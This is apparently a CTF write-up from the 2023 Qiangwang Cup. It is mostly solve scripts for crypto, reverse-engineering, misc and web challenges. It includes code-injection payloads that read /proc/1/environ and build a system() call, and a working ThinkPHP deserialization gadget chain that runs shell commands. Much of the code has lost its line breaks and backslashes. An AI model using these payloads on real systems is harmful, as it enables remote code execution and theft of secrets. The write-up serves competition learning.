# 2023 强网杯 writeup by Arr3stY0u

> 原文: https://www.ctfiot.com/152049.html
> ID: 152049

from Crypto.Util.number import long_to_bytesp=91027438112295439314606669837102361953591324472804851543344131406676387779969e = 641747c = 730024611795626517480532940587152891926416120514706825368440230330259913837764632826884065065554839415540061752397144140563698277864414584568812699048873820551131185796851863064509294123861487954267708318027370912496252338232193619491860340395824180108335802813022066531232025997349683725357024257420090981323217296019482516072036780365510855555146547481407283231721904830868033930943n=p^5K=Zmod(p^5)a=K(c).nth_root(e)b=K(1).nth_root(e)a=int(a)b=int(b)print(b,a)
from tqdm import tqdmfor i in tqdm(range(e)): a=(a*b)%n m=long_to_bytes(int(a)) if b"flag" in m: print(m) break

flag{c19c3ec0-d489-4bbb-83fc-bc0419a6822a}

import itertools
from gmpy2 import *
from Crypto.Util.Padding import *
from Crypto.Util.number import *
from tqdm import tqdm

p = 173383907346370188246634353442514171630882212643019826706575120637048836061602034776136960080336351252616860522273644431927909101923807914940397420063587913080793842100264484222211278105783220210128152062330954876427406484701993115395306434064667136148361558851998019806319799444970703714594938822660931343299
g = 5
c = 105956730578629949992232286714779776923846577007389446302378719229216496867835280661431342821159505656015790792811649783966417989318584221840008436316642333656736724414761508478750342102083967959048112859470526771487533503436337125728018422740023680376681927932966058904269005466550073181194896860353202252854
q = 86691953673185094123317176721257085815441106321509913353287560318524418030801017388068480040168175626308430261136822215963954550961903957470198710031793956540396921050132242111105639052891610105064076031165477438213703242350996557697653217032333568074180779425999009903159899722485351857297469411330465671649

flag_len=12
fake_flag_pad='flag{'.encode() +'x00'.encode()*flag_len+'}'.encode()
flag_pattern = (pad(fake_flag_pad, 128))
#print(flag_pattern)
flag_pattern=bytes_to_long(flag_pattern)

pattern=1<<888
#print(bin(pattern))

cc = c * inverse(pow(g,flag_pattern,p),p)%p
cc = pow(cc, inverse(pattern, q), p)
print(cc)
table = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']
dic = dict()
gtemp= pow(g, 2**48, p)

for half_flag1 in tqdm(itertools.product(table, repeat=6)):
 half_flag1 = bytes_to_long(''.join(half_flag1).encode())
 temp = cc * powmod(gtemp, -(half_flag1), p) % p
 dic[temp] = half_flag1
for half_flag2 in tqdm(itertools.product(table, repeat=6)):
 half_flag2 = bytes_to_long(''.join(half_flag2).encode())
 temp = powmod(g, half_flag2, p)
 if temp in dic:
 print(long_to_bytes(dic[temp]) + long_to_bytes(half_flag2))

from pwn import *from string import printableconn = remote('101.200.122.251', 12188)non_matching_strings = []for i in range(9): for char in printable: payload = 'a'*i + char + 'a'*(8-i) print(conn.recvuntil(b'Enter a string (should be less than 10 bytes):')) conn.sendline(payload.encode()) response = conn.recvline().decode().strip() if response != "Here is your code coverage: 110000000": non_matching_strings.append(payload)for string in non_matching_strings: print(string)

FLAG：qwb{YouKnowHowToFuzz!}

flag{welcome_to_qwb_2023}

{13212}'+(print(open('/proc/1/environ').read()))+'

flag{61e81b4f-566c-49f5-84dd-d79319fddc82}

{13212}'+(open('wsy', "a").write('151155160157162'))+'
{13212}'+(open('wsy', "a").write('t 157'))+'
{13212}'+(open('wsy', "a").write('163;157'))+'
{13212}'+(open('wsy', "a").write('163.'))+'
{13212}'+(open('wsy', "a").write('163y'))+'
{13212}'+(open('wsy', "a").write('st'))+'
{13212}'+(open('wsy', "a").write('em("nl 146*>hzy")'))+'
{13212}'+open('143157de.py','w').write(open('wsy').read())+'
{13212}'+(print(open('hzy').read()))+'

flag{8f0a4ac2-52d3-4adb-a1a3-47e05997817d}

Do you want a flag? Let's listen a little longer.Genshin Impact starts.The weather is really nice today. It's a great day to listen to the Wabby Wabbo radio.If you don't know how to do it, you can go ahead and do something else first.may be flag is png picturedo you know QAM?

import scipy.io.wavfile as wavimport numpy as npimport sys
sample_rate, data = wav.read("flag.wav")for i in data: print(i)flag=''def repla(n): if n == -3: return '00' elif n == -1: return '01' elif n == 1: return '10' elif n == 3: return '11'
for x, y in data: n1 = round(float(x)) n2 = round(float(y)) flag += repla(n1) flag += repla(n2)print(flag)

#!/usr/bin/env python3
# encoding: utf-8
import osimport sysimport loggingimport hashlib
from Crypto.Cipher import AES
logging.basicConfig(level=logging.INFO)

def EVP_BytesToKey(password, key_len, iv_len): m = [] i = 0 while len(b''.join(m)) < (key_len + iv_len): md5 = hashlib.md5() data = password if i > 0: data = m[i - 1] + password md5.update(data) m.append(md5.digest()) i += 1 ms = b''.join(m) key = ms[:
key_len] iv = ms[key_len:
key_len + iv_len]
 return key, iv
def decrypt(cipher,password): key_len = int(256/8) iv_len = 16 mode = AES.MODE_CFB
 key, _ = EVP_BytesToKey(password, key_len, iv_len) cipher = bytes.fromhex(cipher) iv = cipher[:
iv_len] real_cipher = cipher[iv_len:]
 obj = AES.new(key, mode, iv, segment_size=128) plain = obj.decrypt(real_cipher)
 return plain

def main(): # test http request cipher = 'e0a77dfafb6948728ef45033116b34fc855e7ac8570caed829ca9b4c32c2f6f79184e333445c6027e18a6b53253dca03c6c464b8289cb7a16aa1766e6a0325ee842f9a766b81039fe50c5da12dfaa89eacce17b11ba9748899b49b071851040245fa5ea1312180def3d7c0f5af6973433544a8a342e8fcd2b1759086ead124e39a8b3e2f6dc5d56ad7e8548569eae98ec363f87930d4af80e984d0103036a91be4ad76f0cfb00206'
 with open('rockyou.txt','rb') as f: lines = f.readlines() for password in lines: plain = decrypt(cipher,password.strip()) if b'HTTP' in plain: print(password,plain)
if __name__ == "__main__": main()
#b'supermann' b'x03x0f192.168.159.131x00PGET /Why-do-you-want-to-know-what-this-is HTTP/1.1rnHost: 192.168.159.131rnUser-Agent: curl/8.4.0rnAccept: */*rnConnection: closernrn'

flag{dc7e57298e65949102c17596f1934a97}

tshark -r attach.pcapng -Y "tcp" -T fields -e tcp.segment_data > tcp.txt

import pyModeS
with open('tcp.txt','r')as f: lines = f.readlines()for data in lines: if len(data)==47: print(pyModeS.decoder.tell(data[18:]))

flag{4cf6729b9bc05686a79c1620b0b1967b}

import re
data_code = '''*&ptr[0] = unk_710;*&ptr[16] = unk_600;*&ptr[32] = unk_670;*&ptr[48] = unk_6A0;*&ptr[64] = unk_6D0;*&ptr[80] = *byte_810;*&ptr[96] = unk_650;*&ptr[112] = *byte_7E0;*&ptr[128] = *byte_780;*&ptr[144] = unk_720;*&ptr[160] = *byte_790;*&ptr[176] = *byte_760;*&ptr[192] = unk_6E0;*&ptr[208] = unk_5F0;*&ptr[224] = *byte_7F0;*&ptr[240] = unk_680;*&ptr[256] = *byte_830;*&ptr[272] = *byte_7A0;*&ptr[288] = *byte_850;*&ptr[304] = *byte_840;*&ptr[320] = unk_700;*&ptr[336] = unk_630;*&ptr[352] = unk_730;*&ptr[368] = unk_6F0;*&ptr[384] = unk_660;*&ptr[400] = unk_620;*&ptr[416] = *byte_820;*&ptr[432] = unk_640;*&ptr[448] = unk_6B0;*&ptr[464] = unk_690;*&ptr[480] = unk_710;*&ptr[496] = unk_6C0;*&ptr[512] = unk_670;*&ptr[528] = *byte_7B0;*&ptr[544] = unk_6D0;*&ptr[560] = *byte_7C0;'''.strip()
data = bytearray(0x240)for line in data_code.split('n'): off, ea = re.findall(r'ptr[(d+)].+_(.+);', line)[0] off = int(off, 10) ea = int(ea, 16) print(hex(off), hex(ea)) d = ida_bytes.get_bytes(ea, 16) for i in range(16): data[off+i] = d[i]print(bytes(data).hex())s = b''
for b in data: if 32 <= b <= 126: s += bytes([b])print(s)

// flag 1 2v52 = v91;v53 = (int64x2_t)v50;v94 = xmmword_650;v95 = xmmword_740;do{ // unsigned char ida_chars[] = // { // 14, 16, 52, 57, 23, 40, 5, 37, 25, 33, // 46, 12, 58, 22, 32, 32 // }; while ( 1 ) { v63 = idx & 7; // idx % 4 if ( (idx & 3) != 0 ) break; ror_pair = &ror_number[2 * v63]; v55 = (int64x2_t *)&ptr[4 * (idx >> 2)]; v56 = vaddq_s64(v55[1], v53); // round0 x12 = 3131313131313131 v57 = v55->n128_u64[1] + v52.n128_u64[1]; data_x11 = v55->n128_u64[0] + v52.n128_u64[0] + v57; data_x12 = __ROR8__(v57, -*ror_pair) ^ data_x11; v52.n128_u64[0] = data_x11; v60 = __ROR8__(v56.n128_u64[1], -ror_pair[1]); v53.n128_u64[1] = data_x12;
 data_x13 = vaddvq_s64(v56); data_x14 = v60 ^ data_x13; v52.n128_u64[1] = data_x14; ++idx; v53.n128_u64[0] = data_x13; if ( idx == 72 ) goto LABEL_146; } ror_pair2 = &ror_number[2 * v63]; data_x11 = v52.n128_u64[1] + v52.n128_u64[0]; v52.n128_u64[0] = data_x11; data_x12 = __ROR8__(v52.n128_u64[1], -*ror_pair2) ^ data_x11;
 v53.n128_u64[0] = vaddvq_s64(v53); v65 = __ROR8__(v53.n128_u64[1], -ror_pair2[1]); data_x13 = v53.n128_u64[0]; v53.n128_u64[1] = data_x12; data_x14 = v65 ^ v53.n128_u64[0]; v52.n128_u64[1] = data_x14; ++idx;}
while ( idx != 72 );

// x11 0x13c17ce8fc8b8157// x14 0x645d9ac2d095d15b// x13 0x6096448f5a2d874c// x12 0x477d6619faa7d1c7if ( !((data_x11 + 0x5474374041455247LL) ^ 0x6835B4293DD0D39ELL | (data_x14 - 0x7DC131EF140E7742LL) ^ 0xE69C68D3BC875A19LL | (data_x13 - 0x452C699C4F4C522DLL) ^ 0x1B69DAF30AE1351FLL | (data_x12 + 0x6523745F644E5642LL) ^ 0xACA0DA795EF62809LL) ) v49 = (int8x16_t *)aRight;

import struct
from ctypes import c_uint64
ror_number = [0x0E, 0x10, 0x34, 0x39, 0x17, 0x28, 0x05, 0x25, 0x19, 0x21, 0x2E, 0x0C, 0x3A, 0x16, 0x20, 0x20]N = (2**64-1)

def ror8(v, s): s = s % 64 return ((v >> s) | (v << (64-s))) & N

def rol8(v, s): s = s % 64 return ((v << s) | (v >> (64-s))) & N

data = bytes.fromhex('6f4e5f5930555f46897ba4c3c5e378b3c39287b09294a4d3475245414037745430564e645f742365c39287b09294a4d384cc47499565958e66639b8caa5ee9335f3333595f53305f84cc47499565958ebe88f1eb10ce3e82714e5f5930555f464752454140377454be88f1eb10ce3e82d3adb3b06396d3ba33564e645f74236565639b8caa5ee933d3adb3b06396d3ba6dd0506cb4a2449f633333595f53305f6f4e5f5930555f466dd0506cb4a2449fb85889b8c5c285ad4c5245414037745430564e645f742365b85889b8c5c285adabb199987378e8c86b639b8caa5ee9335f3333595f53305fabb199987378e8c8a2dd9d94ff8c0a6e764e5f5930555f464752454140377454a2dd9d94ff8c0a6ec873b5b896c4b49438564e645f74236565639b8caa5ee933c873b5b896c4b49494b5a2bb92b597d9683333595f53305f6f4e5f5930555f4694b5a2bb92b597d99cad3561b4815199515245414037745430564e645f7423659cad3561b4815199a0779ba0a6a6c9a270639b8caa5ee9335f3333595f53305fa0779ba0a6a6c9a2c9c2efe3dd9f5da87b4e5f5930555f464752454140377454c9c2efe3dd9f5da8acc86161858380803d564e645f74236565639b8caa5ee933acc8616185838080897ba4c3c5e378b36d3333595f53305f6f4e5f5930555f46897ba4c3c5e378b3c39287b09294a4d3565245414037745430564e645f742365c39287b09294a4d384cc47499565958e75639b8caa5ee9335f3333595f53305f84cc47499565958ebe88f1eb10ce3e82804e5f5930555f46')data = struct.unpack('<72Q', data)
# print(data)done = Falseidx = 0flag = struct.unpack('<4Q', b'flag{IM_DUMMY_FLAG_1234567890AB}')
# flag = struct.unpack('<4Q', b'00000000111111112222222233333333')v52 = [flag[0], flag[1]]v53 = [flag[2], flag[3]]for idx in range(72): v63 = idx & 7 if idx % 4 == 0: ror_pair = ror_number[2*v63:2*v63+2] v55 = data[4 * (idx >> 2):4 * (idx >> 2)+4] v56 = [c_uint64(v55[2]+v53[0]).value, c_uint64(v55[3]+v53[1]).value] v57 = c_uint64(v55[1]+v52[1]).value data_x11 = c_uint64(v55[0]+v52[0]+v57).value data_x12 = ror8(v57, -ror_pair[0]) ^ data_x11 v52[0] = data_x11 v60 = ror8(v56[1], -ror_pair[1]) v53[1] = data_x12 data_x13 = c_uint64(v56[0]+v56[1]).value data_x14 = v60 ^ data_x13 v52[1] = data_x14 v53[0] = data_x13 continue ror_pair = ror_number[2*v63:2*v63+2] data_x11 = c_uint64(v52[1]+v52[0]).value v52[0] = data_x11 data_x12 = ror8(v52[1], -ror_pair[0]) ^ data_x11 v53[0] = c_uint64(v53[0]+v53[1]).value v65 = ror8(v53[1], -ror_pair[1]) data_x13 = v53[0] v53[1] = data_x12 data_x14 = v65 ^ v53[0] v52[1] = data_x14print(hex(v52[0]), hex(v52[1]))print(hex(v53[0]), hex(v53[1]))
# 密文v52[0]=0x13c17ce8fc8b8157v52[1]=0x645d9ac2d095d15bv53[0]=0x6096448f5a2d874cv53[1]=0x477d6619faa7d1c7
for idx in range(71, -1, -1): v63 = idx & 7 if idx % 4 == 0: ror_pair = ror_number[2*v63:2*v63+2] v55 = data[4 * (idx >> 2):4 * (idx >> 2)+4] data_x13 = v53[0] data_x14 = v52[1] v60 = data_x14 ^ data_x13 data_x12 = v53[1] v56[1] = rol8(v60, -ror_pair[1]) data_x11 = v52[0] v56[0] = c_uint64(data_x13-v56[1]).value data_x12 ^= data_x11 v57 = rol8(data_x12, -ror_pair[0]) v52[1] = c_uint64(v57-v55[1]).value v52[0] = c_uint64(data_x11-v55[0]-v57).value v53[0] = c_uint64(v56[0]-v55[2]).value v53[1] = c_uint64(v56[1]-v55[3]).value continue ror_pair = ror_number[2*v63:2*v63+2] data_x14 = v52[1] v65 = data_x14 ^ v53[0] data_x12 = v53[1] v53[1] = rol8(v65, -ror_pair[1]) v53[0] = c_uint64(v53[0]-v53[1]).value data_x12 ^= v52[0] v52[1] = rol8(data_x12, -ror_pair[0]) v52[0] = c_uint64(v52[0]-v52[1]).valuefrom Crypto.Util.number import long_to_bytesprint(long_to_bytes(v52[0])[::-1])print(long_to_bytes(v52[1])[::-1])print(long_to_bytes(v53[0])[::-1])print(long_to_bytes(v53[1])[::-1])
# flag{7hIs_I$_nEw_Try1N9_@cu7U@1}

void __cdecl sub_804AB46(int a1){ // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]
 v6 = __readgsdword(0x14u); write(1, &unk_805FBF4, 3u); buf[0] = 0; v5 = 0; memset((char *)buf + 1, 0, 4 * ((((char *)buf - ((char *)buf + 1) + 33) & 0xFFFFFFFC) >> 2)); v1 = read(0, buf, 0x20u); if ( *((_BYTE *)buf + v1 - 1) == 10 ) *((_BYTE *)buf + --v1) = 0; if ( v1 != 22 ) exit(0); if ( memcmp(buf, "flag{", 5u) || v4 != '}' ) exit(0); for ( i = 0; i <= 15; ++i ) *(_BYTE *)(*(_DWORD *)(a1 + 8) + i) = *((_BYTE *)&buf[1] + i + 1);}

case 0xD8: if ( ptr[v70] == ptr[v69] )// .text:
0804AA26 cmp edx, eax

明文 密文首字节flag{0000000000000000} 67flag{0000000000000001} 67flag{0000000000000011} 67flag{0000000001111111} 67flag{0000000011111111} 67flag{0000000111111111} DDflag{0000001111111111} 57flag{0000011111111111} 6Bflag{0000111111111111} 6Bflag{0001111111111111} FEflag{0011111111111111} 04flag{0111111111111111} FAflag{1111111111111111} 1C

# case 0x3B:# ptr[v38] = (int)ptr[v39] >> v40;# // .text:
0804937E sar ebx, cl
from ctypes import c_int32ebx = ida_dbg.get_reg_val('ebx')cl = ida_dbg.get_reg_val('cl')v = (c_int32(ebx).value>>cl)&0xFFFFFFFFprint(f'{ebx:
08X} >> {cl} = {v:
08X}')return 0

# case 0xA5:# ptr[v38] = ptr[v39] << v40;# // .text:
080493C9 shl ebx, clebx = ida_dbg.get_reg_val('ebx')cl = ida_dbg.get_reg_val('cl')v = (ebx<<cl)&0xFFFFFFFFprint(f'{ebx:
08X} << {cl} = {v:
08X}')return 0

# case 0xD8:# if ( ptr[v70] == ptr[v69] )
# // .text:
0804AA26 cmp edx, eaxdx = ida_dbg.get_reg_val('edx')ax = ida_dbg.get_reg_val('eax')print(f'{dx:
02X} == {ax:
02X}')return 0

# case 0xDC:# ptr[v31] = ptr[v32] + ptr[v33];# //.text:
08048FC9 add edx, ecxedx = ida_dbg.get_reg_val('edx')ecx = ida_dbg.get_reg_val('ecx')v = (edx+ecx)&0xFFFFFFFFprint(f'{edx:
08X} + {ecx:
08X} = {v:
08X}')return 0

// flag{0000000011111111}
00000010 >> 2 = 000000040000001F << 8 = 00001F0000000061 << 16 = 006100000000002B << 24 = 2B000000000000CC << 8 = 0000CC00000000FE << 16 = 00FE000000000099 << 24 = 99000000000000DD << 8 = 0000DD0000000071 << 16 = 0071000000000073 << 24 = 73000000000000BB << 8 = 0000BB00000000E1 << 16 = 00E100000000004B << 24 = 4B000000
// xor F3 2F 51 1B 04 FC CE A9 1B EC 40 42 EA 8A D0 7A// v0 = 0x2B611FC3// v1 = 0x99FECC34// v0+=((v1<<4)+k0)^(v1+sum)^((v1>>5)+k1);// v1+=((v0<<4)+k2)^(v0+sum)^((v0>>5)+k3);
57429F48 + 00000000 = 57429F48 ; sum+=delta99FECC34 << 4 = 9FECC340 ; v1 << 423575896 + 9FECC340 = C3441BD6 ; k0+(v1<<4)57429F48 + 99FECC34 = F1416B7C ; sum+v199FECC34 >> 5 = FCCFF661 ; v1>>589654528 + FCCFF661 = 86353B89 ; k1+(v1>>5)
B4304B23 + 2B611FC3 = DF916AE6 ; v0 += ((v1<<4)+k0)^(v1+sum)^((v1>>5)+k1);DF916AE6 << 4 = F916AE60 ; v0<<457429F48 + DF916AE6 = 36D40A2E ; sum+v0 ####DF916AE6 >> 5 = FEFC8B57 ; v0>>5793CDA2B + 99FECC34 = 133BA65F ; v1 += ((v0<<4)+k2)^(v0+sum)^((v0>>5)+k3);......

F3 2F 51 1B 04 FC CE A9 1B EC 40 42 EA 8A D0 7A

0xF3, 0x2F, 0x51, 0x1B, 0x04, 0xFC, 0xCE, 0xA9, 0x1B, 0xEC, 0x40, 0x42, 0xEA, 0x8A, 0xD0, 0x7A

delta: 57429F48rounds: 32k0: 0x23575896k1: 0x89654528

pwndbg> search -t bytes -w -x "96585723"Searching for value: b'x96XW#'[anon_f7cfb] 0xf7d06dcd 0x23575896
pwndbg> dd 0xf7d06dcd-8f7d06dc5 ff0e00cc 094200f7 23575896 00070925f7d06dd5 094210f7 89654528 00070925 094220f7f7d06de5 12582548 00070925 094230f7 45897856
key 23575896 89654528 12582548 45897856

b *0x804aa26
# eax存放的是正确密文，重复该操作16次set $edx=$eaxc
# enc_flag: 9C 6C 48 16 70 12 5a 2d e1 d7 f5 7c c5 46 32 68

#include <stdint.h>#include <stdio.h>
unsigned char enc_flag[16] = { 0x9C, 0x6C, 0x48, 0x16, 0x70, 0x12, 0x5A, 0x2D, 0xE1, 0xD7, 0xF5, 0x7C, 0xC5, 0x46, 0x32, 0x68};
unsigned char xor_k[16] = { 0xF3, 0x2F, 0x51, 0x1B, 0x04, 0xFC, 0xCE, 0xA9, 0x1B, 0xEC, 0x40, 0x42, 0xEA, 0x8A, 0xD0, 0x7A};
int32_t k0 = 0x23575896;int32_t k1 = 0x89654528;int32_t k2 = 0x12582548;int32_t k3 = 0x45897856;int32_t delta = 0x57429F48;
void enc(int32_t *v){ int32_t _sum = 0; int32_t v0 = v[0]; int32_t v1 = v[1]; for (int i = 0; i < 32; i++) { _sum += delta; v0 += ((v1 << 4) + k0) ^ (v1 + _sum) ^ ((v1 >> 5) + k1); v1 += ((v0 << 4) + k2) ^ (v0 + _sum) ^ ((v0 >> 5) + k3); } v[0] = v0; v[1] = v1;}
void dec(int32_t *v){ int32_t _sum = delta * 32; int32_t v0 = v[0]; int32_t v1 = v[1]; for (int i = 0; i < 32; i++) { v1 -= ((v0 << 4) + k2) ^ (v0 + _sum) ^ ((v0 >> 5) + k3); v0 -= ((v1 << 4) + k0) ^ (v1 + _sum) ^ ((v1 >> 5) + k1); _sum -= delta; } v[0] = v0; v[1] = v1;}
int main(){ uint8_t pp[0x10 + 1] = "0000000011111111"; for (int i = 0; i < 8; i++) { pp[i] ^= xor_k[i]; //printf("%02X ", pp[i]); } //puts("");
 int32_t v[2] = {0x123,0x456}; v[0] = *(int32_t *)&pp[0]; v[1] = *(int32_t *)&pp[4]; enc(v); //printf("enc %08X %08Xn", v[0], v[1]); dec(v); //printf("dec %08X %08Xn", v[0], v[1]);
 v[0] = __builtin_bswap32(*(int32_t *)&enc_flag[0]); v[1] = __builtin_bswap32(*(int32_t *)&enc_flag[4]); dec(v); //printf("%08X %08Xn", v[0], v[1]); uint8_t *p = (uint8_t *)v; for (int i = 0; i < 8; i++) { p[i] ^= xor_k[i]; } v[0] = __builtin_bswap32(v[0]); v[1] = __builtin_bswap32(v[1]); printf("flag{"); for (int i = 0; i < 8; i++) { printf("%c", p[i]); } v[0] = __builtin_bswap32(*(int32_t *)&enc_flag[8]); v[1] = __builtin_bswap32(*(int32_t *)&enc_flag[12]); dec(v); //printf("%08X %08Xn", v[0], v[1]); p = (uint8_t *)v; for (int i = 0; i < 8; i++) { p[i] ^= xor_k[i + 8]; } v[0] = __builtin_bswap32(v[0]); v[1] = __builtin_bswap32(v[1]); for (int i = 0; i < 8; i++) { printf("%c", p[i]); } printf("}"); puts("");}

flag{1fu13_n19ela06~!}

#include <string.h>#include <stdio.h>#include <stdlib.h>#include <stdint.h>#include <dlfcn.h>#include <time.h>
typedef int (*PFN_clock_gettime)(clockid_t clock_id, struct timespec *tp);
int clock_gettime(clockid_t clock_id, struct timespec *tp){ void *handle = dlopen("libc.so.6", RTLD_LAZY); PFN_clock_gettime real = (PFN_clock_gettime)dlsym(handle, "clock_gettime"); int res = real(clock_id, tp); int ts = atoi(getenv("TS_VALUE")); tp->tv_sec = ts; // printf("clock_gettime: %ldn", tp->tv_sec); return res;}
// gcc hook.c -shared -o hook.so

do { v53 = plaintext[v51]; ... *(_BYTE *)(*(_QWORD *)dest + v50) = v53 >> 4; ... ... *(_BYTE *)(*(_QWORD *)dest + v54) = v53 & 0xF; ... } while ( v49 != v51 );

0x35 -> 0x03 0x05

import os
enc_flag = open('./cipher_', 'rb').read()ts_start = 1702565186 # 密文文件的时间戳correct_ts = 0for off in range(0, -10, -1): ts = ts_start + off for ch in range(0x20, 0x80, 0x10): open('./1.bin', 'wb').write(bytes([ch])) # time.sleep(0.5) os.system(f'TS_VALUE={ts} LD_PRELOAD=./hook.so ./fancy --input=1.bin') # time.sleep(0.5) cipher = open('./cipher', 'rb').read() if cipher[0] == enc_flag[0]: print('correct_ts: ', ts, hex(cipher[0]), hex(ch)) correct_ts = ts break
# correct_ts: 1702565185 0x3d 0x40if not correct_ts: print('???') exit(0)
flag = b''size = len(enc_flag) // 2for idx in range(size-0x30, size): # 跳过前言 # 先爆破高位 for high in range(0x20, 0x80, 0x10): open('./1.bin', 'wb').write(b'A'*idx+bytes([high])) os.system(f'TS_VALUE={correct_ts} LD_PRELOAD=./hook.so ./fancy --input=1.bin') cipher = open('./cipher', 'rb').read() if cipher[idx*2] == enc_flag[idx*2]: # print(f'high: {high:
02X}') break # 再爆破低位 for low in range(0x10): open('./1.bin', 'wb').write(b'A'*idx+bytes([low])) os.system(f'TS_VALUE={correct_ts} LD_PRELOAD=./hook.so ./fancy --input=1.bin') cipher = open('./cipher', 'rb').read() if cipher[idx*2+1] == enc_flag[idx*2+1]: # print(f'low: {low:
02X}') break flag += bytes([high|low]) print('r'+flag.decode())

flag{Y0u_h@v3_5h@r9_e7e3!C0ngr@tul@t1on5}

import phoenixAESinp = "abcdefghijklmn12"dump = """809D8B75D9097398E20AFE0E6DA11E55399D8B75D909733EE20AFF0E6D401E55399D8B75D909733EE20AFF0E6D401E55809D6F75D9CA7398430AFE0E6DA11E5080CF8B75D5097398E20AFED06DA1785580CD8B7527097398E20AFE026DA1DA55A79D8B75D9097373E20A4A0E6DFC1E55809D8BE3D9092198E210FE0E93A11E55809D3B75D98F7398CF0AFE0E6DA11E00809D8875D93F7398BB0AFE0E6DA11E1780C58B7504097398E20AFE866DA1BD55EF9D8B75D9097328E20A9A0E6D891E55809D8B35D9091598E218FE0EF5A11E55809D8B10D909A198E2E4FE0E2DA11E55809D0675D94373980F0AFE0E6DA11EE680EF8B755F097398E20AFE2D6DA159554B9D8B75D90973D9E20A150E6DCA1E55"""with open(".\dump", "wb") as f: f.write(dump.encode())phoenixAES.crack_file('.\dump', verbose=0)
# Last round key #N found:# EA9F6BE2DF5C358495648BEAB9FCFF81

./aes_keyschedule EA9F6BE2DF5C358495648BEAB9FCFF81 10K00: 51574232303233486170707947616D65K01: BF6B0F928F593CDAEE294CA3A94821C6K02: EF96BB4160CF879B8EE6CB3827AEEAFEK03: 0F11008D6FDE8716E1384C2EC696A6D0K04: 97357039F8EBF72F19D3BB01DF451DD1K05: E9914EA7117AB98808A90289D7EC1F58K06: 075124A9162B9D211E829FA8C96E80F0K07: D89CA874CEB73555D035AAFD195B2A0DK08: 61797FA0AFCE4AF57FFBE00866A0CA05K09: 9A0D149335C35E664A38BE6E2C98746BK10: EA9F6BE2DF5C358495648BEAB9FCFF81

from Crypto.Cipher import ARC4key = b"WelcomeToQWB2023"with open(".\License.dat", "rb") as f: data = f.read()rc4 = ARC4.new(key)data = rc4.decrypt(data)with open(".\License_dec.dat", "wb") as f: f.write(data)

import structv28 = bytes.fromhex('45B6AB21796BFE965C1D04B28AA6B86A35F12ABF17D3036B')key = struct.unpack('<4I', b'WelcomeToQWB2023')_delta = 3735928559flag = b''for i in range(0, len(v28), 8): _sum = (32*_delta) & 0xFFFFFFFF v0, v1 = struct.unpack_from('<2I', v28, i) for k in range(32): v1 -= ((v0 << 4) + key[2] ^ v0 + _sum ^ (v0 >> 5) + key[3]) v1 &= 0xFFFFFFFF v0 -= ((v1 << 4) + key[0] ^ v1 + _sum ^ (v1 >> 5) + key[1]) v0 &= 0xFFFFFFFF _sum -= _delta _sum &= 0xFFFFFFFF flag += struct.pack('<2I', v0, v1)print(flag)
# dotN3t_Is_1nt3r3sting

from hashlib import md5h = md5(open(".\License_dec.dat", "rb").read()).digest()v10 = bytearray.fromhex( '3B416C6EDF5AF5E2067ADBAA93B016BE3C183A569661BCA67168E8C5EAE116B7284E6674')for i in range(len(v10)): v10[i] ^= h[i % len(h)]print(v10)
# flag{d0tN3t_I5_Ea57_2_y09!G00d_Luck}

<?phpnamespace thinkprocesspipes{ use thinkmodelPivot; ini_set('display_errors',1); class Windows{ private $files = []; public function __construct($function,$parameter){ $this->files = [new Pivot($function,$parameter)]; } } $aaa = new Windows('system','nl /f*'); echo base64_encode(serialize(array($aaa)));}namespace think{ abstract class Model {}}namespace thinkmodel{ use thinkModel; use thinkconsoleOutput; class Pivot extends Model{ protected $append = []; protected $error; public $parent; public function __construct($function,$parameter){ $this->append['jelly'] = 'getError'; $this->error = new relationBelongsTo($function,$parameter); $this->parent = new Output($function,$parameter); } } abstract class Relation{}}namespace thinkmodelrelation{ use thinkdbQuery; use thinkmodelRelation; abstract class OneToOne extends Relation{} class BelongsTo extends OneToOne{ protected $selfRelation; protected $query; protected $bindAttr = []; public function __construct($function,$parameter){ $this->selfRelation = false; $this->query = new Query($function,$parameter); $this->bindAttr = ['']; } }}namespace thinkdb{ use thinkconsoleOutput; class Query{ protected $model; public function __construct($function,$parameter){ $this->model = new Output($function,$parameter); } }}namespace thinkconsole{ use thinksessiondriverMemcache; class Output{ protected $styles = []; private $handle; public function __construct($function,$parameter){ $this->styles = ['getAttr']; $this->handle = new Memcache($function,$parameter); } }}namespace thinksessiondriver{ use thinkcachedriverMemcached; class Memcache{ protected $handler = null; protected $config = [ 'expire' => '', 'session_name' => '', ]; public function __construct($function,$parameter){ $this->handler = new Memcached($function,$parameter); } }}namespace thinkcachedriver{ use thinkRequest; class Memcached{ protected $handler; protected $options = []; protected $tag; public function __construct($function,$parameter){ // pop链中需要prefix存在，否则报错 $this->options = ['prefix' => 'jelly/']; $this->tag = true; $this->handler = new Request($function,$parameter); } }}namespace think{ class Request { protected $get = []; protected $filter; public function __construct($function,$parameter){ $this->filter = $function; $this->get = ["jelly"=>$parameter]; } }}//YToxOntpOjA7TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJqZWxseSI7czo4OiJnZXRFcnJvciI7fXM6ODoiACoAZXJyb3IiO086MzA6InRoaW5rXG1vZGVsXHJlbGF0aW9uXEJlbG9uZ3NUbyI6Mzp7czoxNToiACoAc2VsZlJlbGF0aW9uIjtiOjA7czo4OiIAKgBxdWVyeSI7TzoxNDoidGhpbmtcZGJcUXVlcnkiOjE6e3M6ODoiACoAbW9kZWwiO086MjA6InRoaW5rXGNvbnNvbGVcT3V0cHV0IjoyOntzOjk6IgAqAHN0eWxlcyI7YToxOntpOjA7czo3OiJnZXRBdHRyIjt9czoyODoiAHRoaW5rXGNvbnNvbGVcT3V0cHV0AGhhbmRsZSI7TzoyOToidGhpbmtcc2Vzc2lvblxkcml2ZXJcTWVtY2FjaGUiOjI6e3M6MTA6IgAqAGhhbmRsZXIiO086Mjg6InRoaW5rXGNhY2hlXGRyaXZlclxNZW1jYWNoZWQiOjM6e3M6MTA6IgAqAGhhbmRsZXIiO086MTM6InRoaW5rXFJlcXVlc3QiOjI6e3M6NjoiACoAZ2V0IjthOjE6e3M6NToiamVsbHkiO3M6NjoibmwgL2YqIjt9czo5OiIAKgBmaWx0ZXIiO3M6Njoic3lzdGVtIjt9czoxMD